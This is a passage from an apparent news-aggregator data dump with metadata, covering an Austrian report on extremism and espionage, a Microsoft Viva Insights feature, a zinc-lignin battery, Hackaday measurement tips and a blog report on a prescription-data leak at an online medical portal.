Klimaaktivisten\", erkl\u00e4rte Innenminister Gerhard Karner bei der Vorstellung des Verfassungsschutzberichtes 2023 am 16. Mai 2024 in Wien.\nOmar Haijawi-Pirchner, Direktor der DSN, betonte: \"Seit Beginn der Arbeit der DSN ist unser oberster Anspruch, die demokratischen Werte der Republik \u00d6sterreichs aktiv zu sch\u00fctzen. Die geopolitische Lage stellt uns vor neue Herausforderungen und erschwert die Arbeit des Verfassungsschutzes. Die Bedrohungen in den einzelnen Bereichen sind gro\u00df, sowohl im rechtsextremistischen als auch linksextremistischen und islamistischen Bereich.\"\nTerror und Spionage: Messenger-\u00dcberwachung \u00fcberf\u00e4llig\nDurch die thematisierten verschiedenen staatspolizeilichen Bedrohungslagen unterstrichen sowohl der Innenminister als auch der Direktor der DSN erneut die unumg\u00e4ngliche Notwendigkeit gezielter \u00dcberwachung, nicht nur von Telefonen, sondern auch von modernen Kommunikationskan\u00e4len wie Messengerdiensten.\nSo sah 2023 eine Zunahme an abstrakten und konkreten Gef\u00e4hrdungslagen: Durch das Erstarken von Terrororganisationen wie al-Quaida oder dem IS kam es zu einer Zunahme an Aufrufen zur Umsetzung von Terroranschl\u00e4gen, auch in \u00d6sterreich.\nInnenminister Karner: \"Wir brauchen zeitgem\u00e4\u00dfe und moderne Befugnisse f\u00fcr die Polizei und den Verfassungsschutz. Auch bei Messengerdiensten brauchen wir \u00dcberwachungsm\u00f6glichkeiten. Dabei handelt es sich nicht um Massen\u00fcberwachung, sondern darum, in schweren F\u00e4llen nach richterlicher Anordnung zum Schutz der Bev\u00f6lkerung einzuschreiten.\"\n\"Die aktuellen Entwicklungen zeigen, dass wir die gesetzlichen Rahmenbedingungen adaptieren m\u00fcssen. Die Notwendigkeit der Modernisierung der Ermittlungsbefugnisse ist derzeit sichtbarer denn je\", sagte der DSN-Direktor.\nBeide unterstrichen neuerlich und eindeutig, dass diese Befugnisse ausschlie\u00dflich f\u00fcr schwere Straftaten gelten und ausschlie\u00dflich unter jenen strengen Kriterien angewendet werden sollen, die es f\u00fcr bereits vorhandene Befugnisse gibt und auch schon lange umgesetzt werden (z.B. Observation, \"Lauschangriff\" oder das \u00d6ffnen von Briefsendungen).\nAllgemeine Zunahme extremistischer Aktivit\u00e4ten: Rechtsextremismus\nIm Jahr 2023 kam es zu einer Zunahme extremistischer Aktivit\u00e4ten im Rechtsextremismus, im Linksextremismus, im Bereich der demokratieablehnenden Szene und im islamistischen Extremismus.\nBesonders im rechtsextremen Spektrum blieb das Risiko der rechtsextrem-motivierten Tathandlungen und die nachhaltige Radikalisierung konstant erh\u00f6ht. Die Versammlungst\u00e4tigkeiten im rechts-extremen Bereich haben sich 2023 im Vergleich zum Vorjahr verdreifacht.\nIm Bereich der \"Alten Rechten\" kam es zu konspirativen Vernetzungen im Untergrund und zu einem Anstieg gezielter, politisch motivierter Gewalt. Durch den illegalen und legalen Besitz einer gro\u00dfen Anzahl an Waffen zeigt sich das Gewaltpotenzial als erh\u00f6ht.\nDie Eskalation des Nahostkonflikts im Oktober 2023 diente speziell den \"Neuen Rechten\" als Best\u00e4tigung ihrer Haltung gegen die Migration und den Islam. Angesichts der Wahlen werden sogenannte \"Alternative Medien\" genutzt, um gezielt und aktiv Information und Desinformation zu verbreiten. Darunter f\u00e4llt auch die verst\u00e4rkte Verwendung des Kampfbegriffs der \"Remigration\", die unter anderem die Terminologie der Gruppierung \"Identit\u00e4re Bewegung \u00d6sterreich\" pr\u00e4gt.\nLinksextremismus: Gaza-Konflikt als N\u00e4hrboden f\u00fcr Narrative\nHauptziel des linksextremen Spektrums war im Jahr 2023 der propagierte Kampf gegen Rechtsextremismus und Faschismus in Verbindung mit den zentralen Kernnarrativen Antifaschismus, Antirepression und Antikapitalismus. Hierbei wird von einzelnen Akteuren auch die physische Konfrontation mit rechten oder rechtsextremen Akteuren gesucht, etwa bei Kundgebungen.\nIm Hinblick auf die Eskalation des Nahostkonflikts \u00e4u\u00dferten Akteurinnen und Akteure des Linksextremismus offen Sympathie f\u00fcr die pal\u00e4stinensische Seite. Gr\u00fcnde daf\u00fcr sind die antiimperialistische Haltung und die Solidarisierung mit den Unabh\u00e4ngigkeitsbestrebungen. Dies f\u00fchrte zu intensiver Beteiligung an Kundgebungen und Demonstrationen.\nKlimaschutz wird wie zahlreiche andere aktuelle gesellschaftliche Themen vom linksextremen Spektrum aufgegriffen und aufgrund seiner Aktualit\u00e4t und medialen Pr\u00e4senz zur Rekrutierung genutzt.\nEs kann nach den derzeitigen Entwicklungen zwar nicht im Allgemeinen davon gesprochen werden, dass von der \"Klimaschutzbewegung\" eine schwere Gefahr f\u00fcr die \u00f6ffentliche Sicherheit ausgeht, jedoch ist zu beobachten, dass einzelne Personen und Personenzusammenschl\u00fcsse extreme Mittel einsetzen und punktuell die Grenze des \"zivilen Ungehorsams\" \u00fcberschreiten.\nAnstieg des islamistischen Extremismus und Terrorismus\nEin besonderes Augenmerk legt der VSB 2023 auf die Entwicklungen im Bereich des islamistischen Extremismus. \u00d6sterreich verzeichnete analog zu ganz Europa eine Zunahme an abstrakten Gefahren-potenzialen, aber auch an konkreten Gefahrenlagen.\nIm Mittelpunkt stand vor allem der \"Islamische Staat Provinz Khorasan\" (ISKP), vor dem die DSN bereits gewarnt hatte. Die in Europa agierenden Zellen des ISKP sind gut organisiert und professionell in der Planung und Umsetzung von gro\u00dfen koordinierten Terroranschl\u00e4gen. Die zentralen Akteure innerhalb der etablierten islamistischen Strukturen stehen in Kontakt mit internationalen F\u00fchrern des ISKP und erhalten Unterst\u00fctzung und Anweisungen bez\u00fcglich der zu w\u00e4hlenden Methoden und Anschlagszielen. In virtuellen Gruppen wird in weiterer Folge \u00fcber Anschlagspl\u00e4ne kommuniziert und Anleitungen zur Planung, Waffenbeschaffung sowie der Durchf\u00fchrung von Anschl\u00e4gen werden geteilt.\nDie Entwicklungen im Nahostkonflikt werden weiterhin neue Radikalisierungsprozesse ausl\u00f6sen beziehungsweise bestehende beschleunigen oder verst\u00e4rken. Der Verfassungsschutz arbeitet kontinuierlich daran, potenzielle Gef\u00e4hrderinnen und Gef\u00e4hrder zu identifizieren und entsprechende Ma\u00df-nahmen zu setzen, hierbei hemmt der Faktor der Online-Kommunikation, wo die Sicherheitsbeh\u00f6rden aktuell keinen Einblick haben, die effektive Einsch\u00e4tzung von Bedrohungen jedoch ma\u00dfgeblich.\nTerrororganisationen riefen weltweit zur Begehung von Terroranschl\u00e4gen auf. Durch gezielte und professionelle, auf junges Publikum adaptierte Online-Propaganda erreichen extremistische Akteure eine breite Reichweite, die Gef\u00e4hrderinnen und Gef\u00e4hrder werden immer j\u00fcnger. Im Hintergrund agieren streng organisierte extremistische Netzwerke, deren Einflussnahme eine gro\u00dfe Auswirkung auf die extremistische Szene in \u00d6sterreich hat.\n\"Die zentralen Akteure innerhalb der etablierten Strukturen stehen in Kontakt mit internationalen F\u00fchrern des IS und erhalten Unterst\u00fctzung und Anweisungen bez\u00fcglich der zu verwendenden Methoden und der Anschlagsziele. Die Kommunikation findet in allen F\u00e4llen entweder pers\u00f6nlich oder mit End-to-End-Verschl\u00fcsselung statt.\", betonte DSN-Direktor Omar Haijawi-Pirchner.\nWachsende Bedrohung durch Spionage und illegalen Waffenhandel\nInsbesondere ausl\u00e4ndische Beh\u00f6rden und deren Spionageaktivit\u00e4ten stellen eine anhaltende Gefahr f\u00fcr die Sicherheit \u00d6sterreichs dar. Im vergangenen Jahr setzte man sich mit der m\u00f6glichen Einflussnahme in Hinsicht auf das Wahljahr 2024 auseinander. Das Verbreiten von Desinformation, die un-zul\u00e4ssige ausl\u00e4ndische Einflussnahme sowie das Durchf\u00fchren von Cyberangriffen spielten im Berichtsjahr 2023 eine gro\u00dfe Rolle.\nDurch die steigende Attraktivit\u00e4t des Wirtschaftsstandorts \u00d6sterreich und das Vorhandensein von spezifischem Wissen in Forschung und Technik werden Spionageaktivit\u00e4ten zunehmen und somit bleibt die Spionageabwehr weiterhin eine bedeutende Aufgabe des Verfassungsschutzes.\nVorausblickend wird der anhaltende Krieg in der Ukraine im Bereich des internationalen illegalen Waffenhandels unter dem Begriff \"Battlefield Collection\" zu einem N\u00e4hrboden werden. F\u00fcr kriminelle und terroristische Gruppierungen k\u00f6nnte \u00d6sterreich als logistisches Zentrum und als Umschlagplatz nach S\u00fcd- und Westeuropa genutzt werden, was wiederum die Gefahr eines Einsatzes der entsprechenden Waffen in \u00d6sterreich erh\u00f6ht.\nSchutz und Pr\u00e4vention: Neue Strategien und Ma\u00dfnahmen\nZu den Aufgabenbereichen der DSN z\u00e4hlen neben dem Schutz der Bev\u00f6lkerung vor verfassungsgef\u00e4hrdenden Bedrohungen auch die Sicherstellung der Handlungsf\u00e4higkeit verfassungsm\u00e4\u00dfiger Einrichtungen sowie der Schutz der Obersten Organe und der Kritischen Infrastruktur.\nIn diesem Zusammenhang legt der Verfassungsschutz einen besonderen Fokus auf Pr\u00e4vention, wie die stellvertretende Direktorin Sylvia Mayer ausf\u00fchrt: \"Durch die Gewinnung, Auswertung und Ana-lyse relevanter Informationen sowie durch Gef\u00e4hrdungs- und Risikoeinsch\u00e4tzungen gewinnen wir einen \u00dcberblick \u00fcber die unterschiedlichsten Gefahrenpotenziale. Den verfassungsschutzrelevanten Bedrohungen kann jedoch nur auf gesamtgesellschaftlicher Ebene vollst\u00e4ndig begegnet werden. Aus diesem Bewusstsein heraus misst die DSN der Pr\u00e4vention in all ihren Aufgabenbereichen eine besondere Bedeutung bei.\"\nIm Zusammenhang mit obersten Organen beurteilt die DSN die entsprechenden Schutz- sowie Sicherheitsma\u00dfnahmen. Im Bereich des Schutzes der kritischen Infrastruktur \u00fcbernimmt der Verfassungsschutz die operative Umsetzung des \u00f6sterreichischen Programms zum Schutz kritischer Infrastrukturen mit dem Ziel der Erh\u00f6hung der Resilienz.\n2023 kam es vereinzelt zu Vorf\u00e4llen bei kritischen Infrastrukturen, welche die Funktionsf\u00e4higkeit dieser Einrichtungen gef\u00e4hrden h\u00e4tten k\u00f6nnen. Hierbei handelte es sich einerseits um technische Ge-brechen ohne Fremdeinwirkung, andererseits aber auch um Sabotageakte oder Drohungen. Mit dem mobilen Pr\u00e4ventionsteam ist die DSN \u00f6sterreichweit im Austausch mit Unternehmen, um diese hin-sichtlich aller Erscheinungsformen der Wirtschafts- und Industriespionage zu sensibilisieren. In diesem Zusammenhang dient zudem das Cyber Security Center der DSN als Kontaktstelle f\u00fcr kritische Infrastrukturen, verfassungsm\u00e4\u00dfige Einrichtungen und internationale Organisationen betreffend bedrohungsabh\u00e4ngiger Cyber Threat Intelligence.\nEinen besonderen Schwerpunkt im Verfassungsschutz stellt dar\u00fcber hinaus die Extremismuspr\u00e4vention und Deradikalisierung dar. Die DSN setzt dabei gemeinsam mit den LSE auf die Zusammenarbeit mit Bildungseinrichtungen und der Zivilgesellschaft. Speziell Schulen spielen bei der Extremismuspr\u00e4vention eine Schl\u00fcsselrolle.\nIm Jahr 2023 stand die Ausrollung der \u00f6sterreichweiten und standardisierten Ausbildung von Pr\u00e4ventionsbediensteten im Bereich der Extremismuspr\u00e4vention im Mittelpunkt. \u00dcber 80 Extremis-muspr\u00e4ventionsbedienstete wurden ausgebildet und setzen gegenw\u00e4rtig bereits Pr\u00e4ventionsma\u00df-nahmen in den Bundesl\u00e4ndern um. Im Rahmen des Bundesweiten Netzwerks Extremismuspr\u00e4vention und Deradikalisierung (BNED), in dem die DSN mit Beh\u00f6rden, zivilgesellschaftlichen Organisationen, der Wirtschaft und der Wissenschaft kooperiert, entstand 2023 das Center for Security Analysis and Intelligence Research in der DSN. Dabei handelt es sich um ein Analyse- und Beratungsgremium zur wissenschaftlich fundierten Beratung sowie strategischen Erkennung von Prognosen zu f\u00fcr den Verfassungsschutz relevanten Entwicklungen.", "hash": "9043a97a771137a596c4f3f17197c3e3f07231a48b23cca3aa9fd407de602b90", "id": "7c6d0aab-4cb4-4dc1-8390-3daba3ff0906", "link": "https://www.bmi.gv.at/news.aspx?id=4D445373397972524239343D", "osint_source_id": "14947e61-4bf4-43e2-8c0c-0ee6310991de", "published": "2024-05-16T14:45:00", "source": "http://www.bmi.gv.at/rss/bmi_presse.xml", "story_id": "1d57c61c-ddeb-457a-becd-5aaf97d165b1", "title": "Verfassungsschutzbericht 2023: Konflikte n\u00e4hren Bedrohungen auch in \u00d6sterreich"}], "tags": {"BNED": {"name": "BNED", "tag_type": "ORG"}, "DSN": {"name": "DSN", "tag_type": "ORG"}, "Europa": {"name": "Europa", "tag_type": "LOC"}, "Gerhard Karner": {"name": "Gerhard Karner", "tag_type": "PER"}, "Hamas": {"name": "Hamas", "tag_type": "ORG"}, "ISKP": {"name": "ISKP", "tag_type": "ORG"}, "Islam": {"name": "Islam", "tag_type": "MISC"}, "Israel": {"name": "Israel", "tag_type": "Country"}, "Karner": {"name": "Karner", "tag_type": "PER"}, "LSE": {"name": "LSE", "tag_type": "ORG"}, "Omar Haijawi-Pirchner": {"name": "Omar Haijawi-Pirchner", "tag_type": "PER"}, "Sylvia Mayer": {"name": "Sylvia Mayer", "tag_type": "PER"}, "S\u00fcd": {"name": "S\u00fcd", "tag_type": "LOC"}, "Ukraine": {"name": "Ukraine", "tag_type": "Country"}, "VSB": {"name": "VSB", "tag_type": "ORG"}, "Westeuropa": {"name": "Westeuropa", "tag_type": "LOC"}, "Wien": {"name": "Wien", "tag_type": "LOC"}, "\u00d6sterreich": {"name": "\u00d6sterreich", "tag_type": "Country"}, "\u00d6sterreichs": {"name": "\u00d6sterreichs", "tag_type": "LOC"}}, "title": "Verfassungsschutzbericht 2023: Konflikte n\u00e4hren Bedrohungen auch in \u00d6sterreich"}, {"attributes": [{"created": "2024-05-16T17:28:16.013901", "id": "1b296e6c-903f-49de-83d5-9af6925d88f9", "key": "NLP_BOT", "value": "17"}], "created": "2024-05-16T14:40:00", "id": "97efba2c-39c0-4e49-afec-b114e229d4ff", "news_items": [{"author": "msmash", "content": "'Microsoft's Quest For Short-Term $$$ is Doing Long-Term Damage To Windows, Surface, Xbox, and Beyond' (windowscentral.com) 30\nIn an op-ed on Windows Central, the site's co-managing editor Jez Corden laments Microsoft's \"short-sighted\" decision-making and \"inconsistent\" investment in its products and services, which he argues has led to a loss of trust among customers and missed opportunities in the tech industry.

With the new ONA experience, an analyst can uncover insights such as:\n \n\u2022 Are specific groups or business units now working more closely with each other, as was intended? If so, which ones, and what is the extent of the collaboration change?\n\u2022 Are any groups now collaborating less with each other? If so, which ones, and how much less?\n\u2022 How is the collaboration behavior of the individual group members contributing to the change (increase/decrease) in collaboration activities of the overarching group?\n\u2022 Are any groups demonstrating an increased tendency towards within-group collaboration? If so, which groups?\n \nTwo categories of insights are surfaced within the experience: the first insights category is centered on Significant change in collaboration and the second insights category is focused on Showing signs of insularity. A 3rd category of insights focused on information brokers is coming soon.\n \nThe Significant change in collaboration insights category highlights groups which have witnessed significant changes in collaboration patterns following the change event. Analysts can use this insight category to analyze how collaboration has evolved (i.e., increased or decreased) across specific groups, as well as delve into how the collaboration behavior between subgroups within the larger groups has morphed. For example, within this insights category, analysts can not only analyze the changes in collaboration between the Product and Marketing groups before and after a reorganization, but the analyst can also dig a level deeper into examining how the collaboration between the sub-groups (for example: levels) that constitute the Product and Marketing groups have morphed.\n \nLearn more about Significant change in collaboration insights.\n \nThe Showing signs of insularity insights category details which groups are connecting more within their own group than expected, as opposed to connecting with other groups outside their own group. This tendency toward within-group collaboration is referred to as \u201cinsularity.\u201d\n \nAn increase in insularity for a group could mean that the group is at risk of becoming siloed from the rest of the organization, which could be a worrisome trend.\n \nLearn more about Showing signs of insularity in collaboration insights.\n \nLet us look at a few different views of the experience to see how these types of insights are visually presented.\n \n1. Side-by-side network view. This view shows the changes in insularity for your selected network groups between the \u201cbefore\u201d time period on the left, and the \u201cafter\u201d time period on the right. The inward-facing triangles within the Product Management and Sales groups identify those groups as showing insular collaboration tendencies.\n \n\n \n2. Subgroup view for deeper analysis. When you select an individual group or node in the network view, you can see a breakdown of how the subgroups that constitute the overarching group contributed to the larger group\u2019s overall collaboration activities. In this example, you can see the collaboration time that each of the sub-groups has contributed to the total collaboration time for the Sales group. The names of the sub-groups displayed below indicate manager group names, not individual employees. \n \n\n\u00a0\n3. Matrix view for cross-group quantitative insights. With this view, analysts can get a more granular view of the collaboration changes between groups. Each cell in the matrix provides the percent increase or decrease in collaboration time between two groups for the chosen time period. In this example, the collaboration time between the Defense and Commerce groups increased by about 163 percent.\n\u00a0\n\n\u00a0\n\n Chart view for evaluating Insularity:\u00a0The second insights category for insularity includes a chart view\u00a0which provides insights on insular collaboration behavior i.e., which groups are connecting more than expected within their own groups. An increasing trend of insular collaboration behavior could result in the group becoming siloed which could impede the flow of information within an organization.\u00a0In the scenario below, for instance, the Sales, HR, and G&A groups are tending towards more insular collaboration behavior, as denoted by the movement of their darker circles from right to left:\n\n\u00a0\n\n\u00a0\nLearn more:\n\u2022 Uncover network collaboration insights | Microsoft Learn\n\u2022 Create change management queries | Microsoft Learn", "hash": "d1055d51f792685e2ff6d52b64e9d210dd8f054af7627e4d01e9d8c6cff7e869", "id": "41afec6e-c925-4973-b187-675e3e589897", "link": "https://techcommunity.microsoft.com/t5/viva-insights-blog/viva-insights-ona-change-management-template-now-generally/ba-p/4140076", "osint_source_id": "0c4fb663-1b11-4849-bc50-10a20eb1496b", "published": "2024-05-16T14:08:10", "source": "https://techcommunity.microsoft.com/plugins/custom/microsoft/o365/custom-blog-rss?tid=-1562856755638734148&amp;board=Exchange&amp;label=Security&amp;messages=&amp;size=30", "story_id": "e564f2a6-2547-4ea6-bf13-ab898fafb48f", "title": "Viva Insights ONA Change Management template now generally available!"}], "tags": {"ONA": {"name": "ONA", "tag_type": "ORG"}}, "title": "Viva Insights ONA Change Management template now generally available!"}, {"attributes": [{"created": "2024-05-16T17:14:10.348962", "id": "ba2d47c0-9699-4146-80c1-41b7654ed90f", "key": "NLP_BOT", "value": "1"}], "created": "2024-05-16T14:05:52", "id": "f92549e9-b321-49c4-8599-0f2e22383ca9", "news_items": [{"author": "", "content": "Neue Batterie aus Zink und Holzabfall ist billig und recyclebar\nSchwedische Forschende haben eine neue Art von Batterie entwickelt, die aus Zink und dem umweltfreundlichen Holzbestandteil Lignin besteht, giftiges Blei sucht man darin indessen vergeblich.

In diesen Batterietyp werden allerdings gro\u00dfe Hoffnungen gesetzt. Irgendwann k\u00f6nnten sie Lithium-Ionen-Batterien sogar vollst\u00e4ndig ersetzen, wenn man sie so baut, dass sie wiederaufladbar sind.\n\u201eObwohl Lithium-Ionen-Batterien bei richtiger Handhabung n\u00fctzlich sind, k\u00f6nnen sie explodieren, sind schwierig zu recyceln und problematisch im Hinblick auf Umwelt- und Menschenrechtsfragen, wegen bestimmten Bestandteilen wie Kobalt. Unsere nachhaltige Batterie ist deshalb eine vielversprechende Alternative, wenn die Energiedichte keine entscheidende Rolle spielt\u201c, sagt der beteiligte Forscher Ziyauddin Khan von der Universit\u00e4t Lik\u00f6ping. Die Energiedichte der neuen Batterie betr\u00e4gt n\u00e4mlich nur 30-50 Wattstunden pro Kilogramm - Lithium-Ionen-Batterien kommen auf das 5-Fache.\nZink wurde stabilisiert\nEin gro\u00dfes Problem von Zink-Batterien war bisher die schlechte Haltbarkeit der Batterien. Weil das Zink darin mit dem Wasser in der Elektrolytl\u00f6sung der Batterie reagierte, wurde Wasserstoffgas freigesetzt. Dadurch ver\u00e4nderte sich das Zink so, dass die Batterien unbrauchbar wurden.\nDen schwedischen Forschenden ist es nun aber gelungen, das Zink in den Batterien zu stabilisieren. Dazu verwendeten sie ein sogenannter Wasser-in-Polymer-Salzelektrolyt, der Batterien mit Zink und Lignin eine hohe Stabilit\u00e4t verleiht. Die Forschung entstand in Kooperation mit dem Start-up Ligna Energy, das bereits seit einigen Jahren an einer Lignin-Batterie forscht.\nG\u00fcnstige Materialien als Hoffnung f\u00fcr Entwicklungsl\u00e4nder\nDie Kombination der Materialien habe au\u00dferdem den Vorteil, dass die Batterie dadurch sehr g\u00fcnstig sei: \u201eSowohl Zink als auch Lignin sind superg\u00fcnstig und die Batterie l\u00e4sst sich leicht recyceln. Und wenn man die Kosten pro Nutzungszyklus berechnet, handelt es sich im Vergleich zu Lithium-Ionen-Batterien um eine g\u00fcnstige Batterie\u201c, sagt Ziyauddin Khan.\nDie Forschenden hoffen, dass ihre Batterie irgendwann in Solarpaneelen eingesetzt werden k\u00f6nnten, die Entwicklungsl\u00e4nder mit Strom versorgen sollen. Derzeit haben sie die Batterie erst im Labor in einer kleinen Variante hergestellt. Sie arbeiten aber daran, dass sie auch viel gr\u00f6\u00dfere Batterien nach demselben Prinzip herstellen k\u00f6nnen.\nKommentare", "hash": "cbf97ad5a80aef5c00d2a4b239eda785883f09e036a830a25af5edd9473861e8", "id": "569abf54-b1ed-4dbe-b0b3-70efc8cccb1b", "link": "https://futurezone.at/science/neue-batterie-aus-zink-und-holzabfall-ist-billig-und-recyclebar/402898856", "osint_source_id": "eec2ad26-2f4c-4dd8-a3e5-08c0eb3765ca", "published": "2024-05-16T14:05:52", "source": "https://futurezone.at/xml/rss", "story_id": "f92549e9-b321-49c4-8599-0f2e22383ca9", "title": "Neue Batterie aus Zink und Holzabfall ist billig und recyclebar"}], "tags": {"Ziyauddin Khan": {"name": "Ziyauddin Khan", "tag_type": "PER"}}, "title": "Neue Batterie aus Zink und Holzabfall ist billig und recyclebar"}, {"attributes": [{"created": "2024-05-16T17:15:01.965105", "id": "a11d287f-727e-4293-bc13-7116fe3496a7", "key": "NLP_BOT", "value": "2"}], "created": "2024-05-16T14:00:10", "id": "8c028241-2e76-4450-97c7-cfc3c2dfac10", "news_items": [{"author": "Anne Ogborn", "content": "Most of the Hackaday community would never wire a power supply to a circuit without knowing the expected voltage and the required current. But our mechanical design is often more bodged. We meet folks who carefully budget power to their microcontroller, sensors, and so on, but never measure the forces involved in their mechanical designs. Then they\u2019re surprised when the motor they chose isn\u2019t big enough for the weight of their robot.\nAn obstacle to being more numbers oriented is lack of basic data about the system. So, here are some simple tools for measuring dynamic properties of small mechanisms; distances, forces, velocities, accelerations, torques, and other things you haven\u2019t thought about since college physics. If you don\u2019t have these in your toolkit, how do you measure?\nDistance\nFor longer distances the usual homeowner\u2019s tools work fine. The mechatronics tinkerer benefits from two tools on the small end. A dial or electronic caliper for measuring small things, and a thickness gauge (or leaf gauge) for measuring small slots.\nA thickness gauge is just metal leaves in different thicknesses, bolted together at one end. Find a combination of leaves that just fits in the space.\nForce\nHere\u2019s four force measuring tools we use to cover different magnitudes of force: a postage scale, a push stick, a spring scale, and a letter scale. The postage scale is best purchased. For big things, the bathroom scale works.\nA push stick is a force measurement device that you can make yourself. We first saw one of these used to tune slot cars, but they\u2019re universally useful. It\u2019s a simple pen shaped device made with a barrel from any small transparent parts tube, a spring, and a plunger with a protruding pin. Grasp the barrel and push the gizmo with the pin, and you can read the force off the tube.\nIf you need it to be calibrated, remember that you just bought a postage scale. Push it into the scale and mark off reasonable increments. Make several, in different sizes. A Z or L shaped plunger is useful for hard to reach places.\nThe conventional spring tension scale is useful, but most commercial ones are terribly made and inaccurate. You can make yourself a better one. They are useful for measuring the spring constant of springs, for learning the tractive effort needed to move a robot, finding the center of gravity of a robot arm, and a hundred other \u2018how much oomph\u2019 things. Again, it\u2019s just a matter of connecting a hook to a spring, and measuring its deflection.\nFor yet lighter weights, you could buy a letter scale, at least in the old days. Today you might have to make your own. It can be as simple as a piece of spring steel fixed to a sheet of calibrated cardboard.\nTorque\nTorque measurements are good not only for sizing actuators, but for measuring efficiency.\nHow you do torque measurements depend on the speed you want to make them at. For static loads, just put a lever of known length on the shaft and measure the force. Torque = distance * force. For fast rotating systems, you can run the system at a known speed and measure the electrical energy used.\nIf you just want to apply a varying known torque to measure efficiency, your life is much easier. Mount a broad wheel of some sort on the shaft \u2014 RC airplane tires work well. Drape a piece of ribbon over the tire. Anchor it at the \u201cout\u201d end and hang a small weight at the \u201cin\u201d end. This is a Prony Brake, and it\u2019s a useful device to know about. The force on the outside of the wheel is just enough to lift the weight \u2013 after that the ribbon slips. The measured torque is then the weight times the wheel radius.\nYou may also want to measure speeds and accelerations. Here, the ubiquity of cell phone cameras is your friend. Suppose you\u2019re animating a crane on your model railroad. Record yourself on video moving the crane with your hands against a protractor to get a feel for speed and acceleration. In video editing software check the positions for various frames, and you now have position changes. The number of frames and distance can help you calculate the speed, and the change in speed vs time is acceleration.\nIf your mechanism is moving too fast for video, use a fast phototransistor or hall effect device and an oscilloscope, or gear down by holding a toy wheel against the shaft and measure the more slowly rotating wheel.\nIn the crane example, the torque you need to supply is the frictional torque plus the acceleration torque, and to calculate the acceleration torque you need the moment of inertia. For refresher: angular acceleration = torque / moment of inertia (\u03c9 = \u03c4 / I) and moment of inertia = mass * radius2 (I = m * r2 ) for point mass.\nYou can drive the crane with a repeatable torque, say using a pulley and weight or a motor, and get the acceleration \u03c91 from the still frames on your video. If you repeat this with a known mass m a known distance r from the shaft axis, like a lump of putty on the end of the crane arm, you can get a second value: \u03c92.\nWrite the \u03c9 = \u03c4 / I equations, \u03c91 = \u03c4 / Icrane and \u03c92 = \u03c4 / (Icrane + r 2 * m). Combining and isolating Icrane and holding our tongues just right, Icrane = r2 * m / (\u03c91 / \u03c92 \u2013 1).\nBe careful to subtract the moment of inertia of your measuring apparatus, and add in the moment of inertia of the final drive if needed. Now you can size your servo with some confidence. Believe me, once you\u2019ve done this a couple times, you\u2019ll never go back to winging it.\nPower\nThe easiest way to get a ballpark feel for power is to simply measure the system\u2019s consumed power by measuring the electrical power at the motor, but this ignores losses in the drive train. And losses are one of the really interesting things to measure. Bad performance is usually friction, and efficiency is a goal for other reasons than just motor sizing or battery life. It\u2019s a measure of how janky your setup is.\nDoes your model train or robot run poorly? Set it to climb a steep grade on a test track. Calculate the work it does: mass * height change. Measure the input electrical power and the time, Energy = V*I*T. You now have an idea of how much the actual power consumption differs from the maximally efficient system. Any power that went in but didn\u2019t appear as potential energy in the choo-choo\u2019s new position is frictional loss. Now you can experiment with loosening and tightening screws, changing gear mesh, and such, and have some idea if you\u2019re making things better or worse.\nConclusion\nNone of the above was rocket science, and you don\u2019t need to do some complex FEM analysis to make the average hacker project. But a bit of real engineering can go a long way towards more reliable mechanisms, and that starts with knowing the numbers you\u2019re dealing with. Taking the required measurements can be simple if you know how to build the tools you need, and your life will be easier with some numbers to guide you.\n5 thoughts on \u201cMeasure Three Times, Design Once\u201d\nSo guilty of this \u263a\ufe0f\nI tend to go with ehat \u201clooks sufficiently beefy\u201d.\n*what\nMasking tape and/or a bigger hammer usually suffices\u2026\nA phrase I frequently heard (and used) growing up in Down East Maine \u2013 \u201cWell, that oughta hold er\u201d\nI remember buying a replacement toilet seat at local Leroy Merlin.

Es lie\u00dfen sich Rezepte f\u00fcr Cannabis-Produkte \u00fcber die Suchmaschinen Bing und DuckDuckGo abrufen. Der Betreiber hat den Sachverhalt einger\u00e4umt, sucht die Schuld aber bei den Suchmaschinen, die die Dateien \"illegaler Weise\" indexiert haben und droht wohl mit rechtlichen Schritten.\nAnzeige\nKleiner R\u00fcckblick auf Dr. Ansay\nAuf dem Online-Portal Dr.Ansay lassen sich Krankschreibungen, aber auch Rezepte von Patienten ordern. Bei der Kombination Dr. Ansay und Rezepte k\u00f6nnte der Eindruck entstehen, dass da ein Mediziner das Portal betreibt. Aber ein Blick ins Impressum der Webseite offenbart (f\u00fcr mich \u00fcberraschend), dass Dr. jur. Can Ansay als beauftragter Rechtsanwalt f\u00fcr den Inhalt der Seite verantwortlich zeichnet. Der Sitz der als Ltd. fungierenden Unternehmung ist Malta, als weitere Adresse wird Hamburg angegeben.\nBeim Portal hat es ein fettes Datenleck gegeben: Ein Verzeichnis mit generierten PDF-Dateien zu Canabis-Rezepten war wohl frei per Internet erreichbar und wurde von der Suchmaschine Bing indexiert.\nDie Suchmaschine DuckDuckGo greift auf diese Daten zu und lieferte demnach auch Treffer auf die betreffenden PDF-Dokument mit Canabis-Rezepten. Dritte konnten also sehen, wer Rezepte f\u00fcr Cannabis f\u00fcr medizinische Zwecke auf der Plattform eingereicht hatte, welche Krankenkasse zust\u00e4ndig ist und wo die Person wohnt.\nDatenlecks sollten, speziell in diesem sensiblen Bereich nicht vorkommen, auszuschlie\u00dfen ist das nicht. Nachdem der Fehler bekannt wurde, hat der Betreiber den Ordner wieder gesch\u00fctzt. PDF-Dateien mit Rezepten sind nicht mehr auffindbar. Aber die Metadaten der Rezepte waren bzw. sind weiterhin per Suchmaschinen (Bing, DuckDuckGo) und Microsoft Copilot abrufbar.\nIch hatte \u00fcber dieses Datenleck im Blog-Beitrag Autsch: Datenleck bei Dr. Ansay, Cannabis-Rezepte in DuckDuckGo sichtbar \u00fcber die Details berichtet und auch etwas zur Plattform geschrieben. Ob dort Cannabis-Rezepte von \u00c4rzten verordnet werden, interessiert in diesem Kontext weniger \u2013 und da habe ich keine Probleme mit. Dass ein Datenleck aufgetreten ist, bleibt weniger sch\u00f6n, ist aber passiert.\nUnternehmen, die gut mit so etwas umgehen, arbeitet man so etwas auf. Ich erw\u00e4hne in diesem Kontext den Beitrag Datenschutz-GAU bei Stay Informed Kindergarten-App, wo deren Datenschutzbeauftragter mich kontaktierte und weitere Informationen bereitstellte. Dort war das Bem\u00fchen, den Fall umfassend aufzubereiten, erkennbar.\nStellungnahme auf dransay.com und Details\nVon Dr. Ansay liegt jetzt auch eine Reaktion vor. In diesem Kommentar hat ein Leser auf die Stellungnahme Datenleck vom 14.05.2024 verlinkt (danke daf\u00fcr).\nHier die relevanten Angaben in Kurzform aus dem Dokument (siehe folgender Screenshot) herausgezogen und bewertet:\nAnzeige\nDas Datenleck 